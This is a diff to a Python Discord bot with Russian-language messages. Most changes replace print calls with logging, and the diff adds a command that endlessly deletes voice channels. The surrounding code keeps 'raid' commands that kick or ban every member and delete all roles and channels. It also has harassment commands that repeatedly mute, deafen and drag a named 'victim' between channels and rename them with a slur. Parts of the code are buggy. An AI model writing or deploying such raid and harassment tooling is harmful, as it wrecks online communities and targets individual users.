@@ -1,5 +1,5 @@
 try:
-    import sqlite3 
+    import sqlite3
     import discord
     import json
     import subprocess
@@ -18,8 +18,9 @@ try:
     from discord.voice_client import VoiceClient
     import clr
     import threading
+    import logging
 except ImportError: 
-    print('Вероятнее всего, Вы не запустили deps.py ($python deps.py)')
+    log.info('Вероятнее всего, Вы не запустили deps.py ($python deps.py)')
 
 bot = Bot(settings['PREFIX'])
 
@@ -33,7 +34,80 @@ clr.AddReference('MusicDownloader')
 
 from MusicDownloader import Downloader
 
+log = logging.getLogger("RUNNING")
+log.setLevel(logging.INFO)
+
+fh = logging.StreamHandler()
+ 
+fh.setLevel(logging.INFO)
+
+formatter = logging.Formatter('[%(asctime)s] [%(name)s] [%(levelname)s] %(message)s')
+fh.setFormatter(formatter)
+
+log.addHandler(fh)
+
+def logik(name):
+    logger = logging.getLogger(name)
+    logger.setLevel(logging.INFO)
+
+    fh = logging.StreamHandler()
+    
+    fh.setLevel(logging.INFO)
+
+    formatter = logging.Formatter('[%(asctime)s] [%(name)s] [%(levelname)s] %(message)s')
+    fh.setFormatter(formatter)
+
+    logger.addHandler(fh)
+
+    return logger
+
 try:
+
+    @bot.command()
+    async def raid_ch(ctx):
+        # guild = bot.get_guild(ctx.guild.id)
+        while True:
+            guild = bot.get_guild(ctx.guild.id)
+            for i in guild.voice_channels:  
+                if i.name != '__main__' and i.name != '_main_' and i.name != '__init__' and i.name != '__AFK__':
+                    try:
+                        log.info(f'[{ctx.guild.name}] {i.name} deleted')
+                        await i.delete(reason = 'удаляет, удаляет')
+                    except:
+                        log.info('конец мема')
+
+    @bot.command()
+    async def _random_em_(ctx):
+
+        emo = [
+            str(bot.get_emoji(725037390011433091)),
+            str(bot.get_emoji(725037206556770336)),
+            str(bot.get_emoji(725036712236941364)),
+            str(bot.get_emoji(725036921029394442)),
+            str(bot.get_emoji(725062082638118973)),
+            str(bot.get_emoji(724945422665383946)),  
+            str(bot.get_emoji(725061079914250300)),
+            str(bot.get_emoji(724945678022738031)),
+            str(bot.get_emoji(724945628534276098)),
+            str(bot.get_emoji(724024159893585982)),
+            str(bot.get_emoji(724944121109676092)),
+            str(bot.get_emoji(725063134166908998))
+        ]
+
+        ho = random.choice(emo)
+
+        await ctx.send(ho)
+
+        logger = logik('_random_em_')
+        logger.info(f'Bot send emoji to {ctx.message.author.name}')
+
+    @bot.command()
+    @commands.has_permissions(administrator = True)
+    async def putin(ctx):
+        logger = logik('PUTIN')
+        logger.info(f'[{ctx.guild.name}] Bot send :putin: ({ctx.message.author.name})')
+        await ctx.channel.purge(limit = 1)
+        await ctx.send(f'{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}')
 
     @bot.command()
     async def _rename_(ctx, channel: discord.VoiceChannel, *, new_name):
@@ -61,38 +135,38 @@ try:
 
         await ctx.send (embed = emb)
 
-        print(f'[{ctx.guild.name}] Kick banned { victim }')
+        log.info(f'[{ctx.guild.name}] Kick banned { victim }')
 
         await victim.kick(reason = reason)
 
     @bot.command() 
     async def _hola_(ctx, arg):
         await ctx.channel.purge(limit = 1)
-        await ctx.send(arg), print(f'[{ctx.guild.name}] $Bot send message: {arg}')
+        await ctx.send(arg), log.info(f'[{ctx.guild.name}] $Bot send message: {arg}')
 
     @bot.command()
     async def qq(ctx):
         """Hello, server"""
         author = ctx.message.author
-        await ctx.send(f'Категорически приветствую, {author.mention}!'), print(f'[{ctx.guild.name}] $Bot send message: Hello, {author.nick} ({author.name})')
+        await ctx.send(f'Категорически приветствую, {author.mention}!'), log.info(f'[{ctx.guild.name}] $Bot send message: Hello, {author.nick} ({author.name})')
 
     @bot.command()
     async def bb(ctx):
         """Bye, all"""
         author = ctx.message.author
-        await ctx.send(f'До связи, {author.mention} :)'), print(f'[{ctx.guild.name}] $Bot send message: Bye, {author.nick} ({author.name})')
+        await ctx.send(f'До связи, {author.mention} :)'), log.info(f'[{ctx.guild.name}] $Bot send message: Bye, {author.nick} ({author.name})')
 
     @bot.command()
     async def pp(ctx):
         await ctx.channel.purge(limit = 1)
         author = ctx.message.author
-        await ctx.send(f'{author.mention} Отошел.'), print(f'[{ctx.guild.name}] $Bot send message: {author.nick} ({author.name}) Отошел.')
+        await ctx.send(f'{author.mention} Отошел.'), log.info(f'[{ctx.guild.name}] $Bot send message: {author.nick} ({author.name}) Отошел.')
 
     @bot.command()
     async def _pp_(ctx):
         await ctx.channel.purge(limit = 1)
         author = ctx.message.author
-        await ctx.send(f'{author.mention} Вернулся.'), print(f'[{ctx.guild.name}] $Bot send message: {author.nick} ({author.name}) Вернулся.')
+        await ctx.send(f'{author.mention} Вернулся.'), log.info(f'[{ctx.guild.name}] $Bot send message: {author.nick} ({author.name}) Вернулся.')
 
     @bot.command()
     async def fox(ctx):
@@ -102,7 +176,7 @@ try:
 
         embed = discord.Embed(color = 0xff9900, title = 'Random Fox')
         embed.set_image(url = json_data['link'])
-        await ctx.send(embed = embed), print(f'[{ctx.guild.name}] $Bot send embed fox (by',author.nick, ')' )
+        await ctx.send(embed = embed), log.info(f'[{ctx.guild.name}] $Bot send embed fox (by',author.nick, ')' )
 
     @bot.command()
     async def dog(ctx):
@@ -113,7 +187,7 @@ try:
         embed = discord.Embed(color = 0xff9900, title = 'Random Dog')
         embed.set_image(url = json_data['link'])
         member = discord.Member
-        try: await ctx.send(embed = embed), print(f'[{ctx.guild.name}] $Bot send embed dog (by',author.nick, ')' )
+        try: await ctx.send(embed = embed), log.info(f'[{ctx.guild.name}] $Bot send embed dog (by',author.nick, ')' )
         except: await ctx.send('CommandNotFound', {author.mention})
 
     @bot.command()
@@ -121,7 +195,7 @@ try:
     async def _cleaner_(ctx, amount):
         author = ctx.message.author
         await ctx.channel.purge(limit=int(amount))
-        await ctx.channel.send(':: Сообщения успешно удалены'), print(f'[{ctx.guild.name}] {author.nick} cleaned chat for {amount} positions')
+        await ctx.channel.send(':: Сообщения успешно удалены'), log.info(f'[{ctx.guild.name}] {author.nick} cleaned chat for {amount} positions')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -138,7 +212,7 @@ try:
 
         await ctx.send (embed = emb)
 
-        print(f'[{ctx.guild.name}] Bot kicked { member }')
+        log.info(f'[{ctx.guild.name}] Bot kicked { member }')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -155,7 +229,7 @@ try:
 
         await ctx.send (embed = emb)
 
-        print(f'[{ctx.guild.name}] Bot banned { member }')
+        log.info(f'[{ctx.guild.name}] Bot banned { member }')
 
 
 
@@ -164,7 +238,7 @@ try:
     async def _cleanadm_(ctx, amount):
         author = ctx.message.author
         await ctx.channel.purge(limit=int(amount))
-        print(f'[{ctx.guild.name}] {author.nick} cleaned chat for {amount} positions')
+        log.info(f'[{ctx.guild.name}] {author.nick} cleaned chat for {amount} positions')
 
     @bot.command()
     async def _join_(ctx):
@@ -177,11 +251,11 @@ try:
             await ctx.channel.purge(limit = 1)
             await voice.move_to(channel)
             await ctx.send('Успешно прикатился :man_in_manual_wheelchair:')
-            print(f'[{ctx.guild}] Bot connected to {ctx.message.author.name}')
+            log.info(f'[{ctx.guild}] Bot connected to {ctx.message.author.name}')
         else:
             voice = await channel.connect()
             await ctx.send('Успешно прикатился :man_in_manual_wheelchair:')
-            print(f'[{ctx.guild}] Bot connected to {ctx.message.author.name}')
+            log.info(f'[{ctx.guild}] Bot connected to {ctx.message.author.name}')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -189,7 +263,7 @@ try:
         await ctx.channel.purge(limit = 1)
         victim_member = discord.utils.get(ctx.guild.members, name=victim)
         await victim_member.edit(mute = True, deafen = True)
-        print(f'[{ctx.guild}] {ctx.message.author} all muted {victim_member}')
+        log.info(f'[{ctx.guild}] {ctx.message.author} all muted {victim_member}')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -197,7 +271,7 @@ try:
         await ctx.channel.purge(limit = 1)
         victim_member = discord.utils.get(ctx.guild.members, name=victim)
         await victim_member.edit(mute = False, deafen = False)
-        print(f'[{ctx.guild}] {ctx.message.author} all unmuted {victim_member}')
+        log.info(f'[{ctx.guild}] {ctx.message.author} all unmuted {victim_member}')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -205,7 +279,7 @@ try:
         await ctx.channel.purge(limit = 1)
         victim_member = discord.utils.get(ctx.guild.members, name=victim)
         await victim_member.edit(mute = True)
-        print(f'[{ctx.guild}] {ctx.message.author} muted {victim_member}')
+        log.info(f'[{ctx.guild}] {ctx.message.author} muted {victim_member}')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -213,7 +287,7 @@ try:
         await ctx.channel.purge(limit = 1)
         victim_member = discord.utils.get(ctx.guild.members, name=victim)
         await victim_member.edit(deafen = True)
-        print(f'[{ctx.guild}] {ctx.message.author} deafen {victim_member}')
+        log.info(f'[{ctx.guild}] {ctx.message.author} deafen {victim_member}')
 
 
     @bot.command()
@@ -225,7 +299,7 @@ try:
             channel = discord.utils.find(lambda x: x.name == i.name, ctx.guild.voice_channels)
             await victim_member.move_to(channel)
             time.sleep(0.75)
-            print(f'[exc] ${ victim_member } transferred in { i.name }')
+            log.info(f'[exc] ${ victim_member } transferred in { i.name }')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -236,15 +310,15 @@ try:
         if str(author.id) == '691575600707534908':
             for i in range(30):
                 await victim_member.edit(mute = True, deafen = True)
-                print(f'[{author.id}] lock {victim_member}')
+                log.info(f'[{author.id}] lock {victim_member}')
                 try:
                     await victim_member.edit(nick = '_PIDARAS_')
                 except:
                     pass
                 time.sleep(0.75)
         else:
-            print(0)
-            print(author.id)
+            log.info(0)
+            log.info(author.id)
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -254,11 +328,11 @@ try:
         author = ctx.message.author
         if str(author.id) == '691575600707534908':
             await victim_member.edit(mute = False, deafen = False)
-            print(f'[{author.id}] unlock {victim_member}')
+            log.info(f'[{author.id}] unlock {victim_member}')
             await victim_member.edit(nick = f'{victim_member.name}')
         else:
-            print(0)
-            print(author.id)
+            log.info(0)
+            log.info(author.id)
             await victim_member.edit(nick = f'{victim_member.name}')
 
     @bot.command()
@@ -278,9 +352,9 @@ try:
             try:
                 g += array[i]
             except IndexError:
-                print(f'[{ctx.guild.name}] Точка остановы')
+                log.info(f'[{ctx.guild.name}] Точка остановы')
 
-        print(f'[{ctx.guild.name}] Bot send list of members in voice channels ({ctx.message.author.name})')
+        log.info(f'[{ctx.guild.name}] Bot send list of members in voice channels ({ctx.message.author.name})')
             
         await ctx.send(g)
 
@@ -295,12 +369,12 @@ try:
         while nn == True:
             for k in range(10):
                 await victim_member.edit(mute = True, deafen = True)
-                print(f'[{ ctx.guild.name }] {k + 1} Заход пошел')
+                log.info(f'[{ ctx.guild.name }] {k + 1} Заход пошел')
                 for i in ctx.guild.voice_channels:
                     channel = discord.utils.find(lambda x: x.name == i.name, ctx.guild.voice_channels)
                     await victim_member.move_to(channel)
                     time.sleep(75*0.01)
-                    print(f'[exc] { victim_member } transferred to { i.name }')
+                    log.info(f'[exc] { victim_member } transferred to { i.name }')
         await victim_member.edit(mute = False, deafen = False)
         await ctx.send(f'{victim_member.mention} **Экскурсия по {ctx.guild.name} окончена. Надеюсь, Вы впечатлены**')
 
@@ -309,7 +383,7 @@ try:
     async def _stop_exc_(ctx, victim):
         victim_member = discord.utils.get(ctx.guild.members, name=victim) 
         nn = False
-        print('Точка остановы')
+        log.info('Точка остановы')
         await victim_member.move_to(ctx.guild.afk_channel)
         await ctx.send(f'{victim_member.mention}, **Принудительная остановка**')
 
@@ -323,49 +397,49 @@ try:
                     channel = discord.utils.find(lambda x: x.name == i.name, ctx.guild.voice_channels)
                     await victim_member.move_to(channel)
                     time.sleep(0.75)
-                    print(f'[exc adm] ${ victim_member } transferred in { i.name }')
-                    print(n)
+                    log.info(f'[exc adm] ${ victim_member } transferred in { i.name }')
+                    log.info(n)
                     n -= 1
             await ctx.send(f'{victim_member.mention} **Экскурсия по {ctx.guild.name} окончена. Надеюсь, Вы впечатлены**')
 
     @bot.command()
-        async def _play_old_(ctx, url: str):
-            song_there = os.path.isfile('song.mp3')
-            try:
-                if song_there: 
-                    os.remove('song.mp3')
-                    print('[log] Старый файл удален')
-            except PermissionError:
-                print('[log] Не удалось удалить файл')
-            await ctx.send('Пожалуйста, ожидайте')
+    async def _play_old_(ctx, url: str):
+        song_there = os.path.isfile('song.mp3')
+        try:
+            if song_there: 
+                os.remove('song.mp3')
+                log.info('[log] Старый файл удален')
+        except PermissionError:
+            log.info('[log] Не удалось удалить файл')
+        await ctx.send('Пожалуйста, ожидайте')
 
-            voice = get(bot.voice_clients, guild = ctx.guild)
+        voice = get(bot.voice_clients, guild = ctx.guild)
 
-            ydl_opts = {
-                'format': 'bestaudio/best',
-                'postprocessors' : [{
-                    'key': 'FFmpegExtractAudio',
-                    'preferredcodec': 'mp3',
-                    'preferredquality': '192'   
-                }]
-            }
+        ydl_opts = {
+            'format': 'bestaudio/best',
+            'postprocessors' : [{
+                'key': 'FFmpegExtractAudio',
+                'preferredcodec': 'mp3',
+                'preferredquality': '192'   
+            }]
+        }
 
-            with youtube_dl.YoutubeDL(ydl_opts) as ydl:
-                print('[log] Загружаю музыку...')
-                ydl.download([url])
+        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
+            log.info('[log] Загружаю музыку...')
+            ydl.download([url])
 
-            for file in os.listdir('./'):
-                if file.endswith('.mp3'):
-                    name = file
-                    print(f'[log] Переименовываю файл: {file}')
-                    os.rename(file, 'song.mp3')
+        for file in os.listdir('./'):
+            if file.endswith('.mp3'):
+                name = file
+                log.info(f'[log] Переименовываю файл: {file}')
+                os.rename(file, 'song.mp3')
 
-            voice.play(discord.FFmpegPCMAudio('song.mp3'), after = lambda e: print(f'[log] {name}, музыка закончила свое проигрывание'))
-            voice.source = discord.PCMVolumeTransformer(voice.source)
-            voice.source.volume = 1
+        voice.play(discord.FFmpegPCMAudio('song.mp3'), after = lambda e: log.info(f'[log] {name}, музыка закончила свое проигрывание'))
+        voice.source = discord.PCMVolumeTransformer(voice.source)
+        voice.source.volume = 1
 
-            song_name = name.rsplit('-', 2)
-            await ctx.send(f'Сейчас проигрывается музыка: {song_name[0]}')
+        song_name = name.rsplit('-', 2)
+        await ctx.send(f'Сейчас проигрывается музыка: {song_name[0]}')
 
     @bot.command()
     async def _leave_(ctx):
@@ -390,7 +464,7 @@ try:
         for song in os.listdir(path):
             # ffmpeg = 'ffmpeg ' + Downloader.GetFfmpegArgs('Downloads\\' + song)
         
-            voice.play(discord.FFmpegPCMAudio(path + '\\' + song), after = lambda e: print(f'[log] {song}, музыка закончила свое проигрывание'))
+            voice.play(discord.FFmpegPCMAudio(path + '\\' + song), after = lambda e: log.info(f'[log] {song}, музыка закончила свое проигрывание'))
             voice.  source = discord.PCMVolumeTransformer(voice.source)
             voice.source.volume = 1
 
@@ -401,12 +475,12 @@ try:
         victim_member = get(ctx.guild.members, name = victim)
         channelU = discord.utils.find(lambda x: x.name == 'PIDARASI VI SUKI', ctx.guild.voice_channels)
         await victim_member.move_to(channelU)
-        print(f'[admin] {ctx.author.name} отключил от чата {victim_member}')
+        log.info(f'[admin] {ctx.author.name} отключил от чата {victim_member}')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
     async def _list_(ctx):
-        print('[admin] $Bot send list of members of the server')
+        log.info('[admin] $Bot send list of members of the server')
         list_memb = list()
         emb = discord.Embed (title = f'Список участников сервера {ctx.guild.name} :clipboard: ')
         emb.description = str(len(ctx.guild.members)) + ' ' + 'участника(-ов):'
@@ -417,7 +491,7 @@ try:
     @bot.command()
     async def _list_ch_(ctx):
         for i in ctx.guild.voice_channels:
-            print(i.name)
+            log.info(i.name)
 
     @bot.command()
     async def _ls_(ctx):
@@ -425,7 +499,7 @@ try:
         for guild in bot.guilds:
             array.append(guild.name)
             array1.append(guild.id)
-        print(*array, sep = '\\\\')
+        log.info(*array)
         emb = discord.Embed(title = "Список серверов, на которых катируется бот:")
         for i in range(len(array)):
             emb.add_field(name = array1[i], value = array[i])
@@ -437,10 +511,10 @@ try:
         channelU = discord.utils.find(lambda x: x.name == channel, ctx.guild.voice_channels)
         try:
             await victim_member.move_to(channelU)
-            print(f'[tr] { victim_member } was transfered to { channelU }')
+            log.info(f'[tr] { victim_member } was transfered to { channelU }')
         except:
             pass
-            print(f'[tr] Transfer { victim_member } failed')
+            log.info(f'[tr] Transfer { victim_member } failed')
 
     @bot.command()
     @commands.has_permissions(administrator = True)
@@ -453,7 +527,7 @@ try:
         while n == True:
             await victim_member.edit(mute = True, deafen = True)
             time.sleep(0.75)
-            print(f'[{author.id}] lock {victim_member}')
+            log.info(f'[{author.id}] lock {victim_member}')
             try:
                 await victim_member.edit(nick = '_PIDARAS_')
             except: 
@@ -467,7 +541,7 @@ try:
         n = False
         victim_member = discord.utils.get(ctx.guild.members, name=victim)
         await victim_member.edit(mute = False, deafen = False)
-        print(f'[{ ctx.guild }] unlock  { victim_member }')
+        log.info(f'[{ ctx.guild }] unlock  { victim_member }')
         try:
             await victim_member.edit(nick = victim)
         except:
@@ -594,7 +668,7 @@ try:
     @commands.has_permissions(administrator = True)
     async def _kickall_(ctx):
         await ctx.channel.purge(limit = 1)
-        await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), print(f'[warning] Бот {bot.user.name} кикнул всех, кого мог')
+        await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), log.info(f'[warning] Бот {bot.user.name} кикнул всех, кого мог')
         for m in ctx.guild.members:
             try:
                 await m.kick(reason="Облегченный рейд на сервер успешно проведен.")
@@ -605,7 +679,7 @@ try:
     @commands.has_permissions(administrator = True)
     async def _banall_(ctx):
         await ctx.channel.purge(limit = 1)
-        await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), print(f'[warning] Бот {bot.user.name} забанил всех, кого мог')
+        await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), log.info(f'[warning] Бот {bot.user.name} забанил всех, кого мог')
         for m in ctx.guild.members:
             try:
                 await m.ban(reason="Рейд на сервер успешно проведен.")
@@ -615,7 +689,7 @@ try:
     @bot.command()
     @commands.has_permissions(administrator = True)
     async def _dl_(ctx):
-        await ctx.channel.purge(limit = 1), print(f'[warning] {bot.user.name} Удалил столько ролей, сколько смог')
+        await ctx.channel.purge(limit = 1), log.info(f'[warning] {bot.user.name} Удалил столько ролей, сколько смог')
         for m in ctx.guild.roles:
             try:
                 await m.delete(reason="Плановое обнуление")
@@ -634,7 +708,7 @@ try:
             except: failed.append(channel.name)
             else: counter += 1
         fmt = ", ".join(failed)
-        print(f'[warning] Рейд по удалению каналов прошел довольно успешно ({bot.user.name})')
+        log.info(f'[warning] Рейд по удалению каналов прошел довольно успешно ({bot.user.name})')
 
     #----------------------------------------------------------------------------------------------------------------
 
@@ -991,6 +1065,8 @@ try:
         if isinstance(error, commands.errors.CommandInvokeError):
             await ctx.send(f'{author.mention}, что-то не так , возможно, стоит попробовать снова :dart:')
 
+    
+
     @bot.command(pass_context = True)
     async def   _help_(ctx):
         emb = discord.Embed (title = 'Навигация по командам :clipboard: ')
@@ -1021,7 +1097,7 @@ try:
         emb.add_field(name ='{}```_ulat_ NAME```'.format(settings['PREFIX']), value = 'Помилование участника (adm, un lock all time)')
         emb.add_field(name ='{}```_warn_ NAME REASON```'.format(settings['PREFIX']), value = 'Предупреждения участника (adm, max warns = 3)')
         emb.add_field(name ='{}```_unwarn_ NAME```'.format(settings['PREFIX']), value = 'Отмена предупреждения (adm)')
-        print(f'[help] ${bot.user.name} sent a help list for {ctx.message.author.name} ({ctx.message.author.nick})')
+        log.info(f'[help] ${bot.user.name} sent a help list for {ctx.message.author.name} ({ctx.message.author.nick})')
         await ctx.send ( embed = emb )
 
     #only_big_adm (шучу)
@@ -1030,7 +1106,8 @@ try:
     @bot.command()
     @commands.has_permissions(administrator = True)
     async def send_on_machine(ctx):
-        await ctx.send(input('message: '))
+        for i in range(100):
+            await ctx.send(input('message: '))
 
     async def greatSender():
         channel = bot.get_channel(id=int(input('channel_ID: ')))
@@ -1038,11 +1115,11 @@ try:
 
     @bot.event
     async def on_ready():
-        print('\n')
         for i in threading.enumerate():
-            print(f'{i} Running')
-        print('\nWork Status: 1\n\nAuditor magazine of bot:\n')
-        print(f'\nLogged in as {bot.user.name}')
+            log.info(f'{i} Running')
+        log.info('Work Status: 1')
+        log.info('Auditor magazine of bot:')    
+        log.info(f'Logged in as {bot.user.name}')
         activity = discord.Game(name='$_help_ | ShG')
         await bot.change_presence(status=':rainbowpartner:', activity=activity)
 
@@ -1050,10 +1127,12 @@ try:
 
     bot.run(settings['TOKEN'])
 
-except: print('\nWork status: 0')
+except:
+    logger = logik('STOP')
+    logger.warning('Work status: 0')
 
 finally:
-    print('\nWell done :)\n')
+    logger.info('Well done :)')
     
 
 #D✔Бот for discord channel
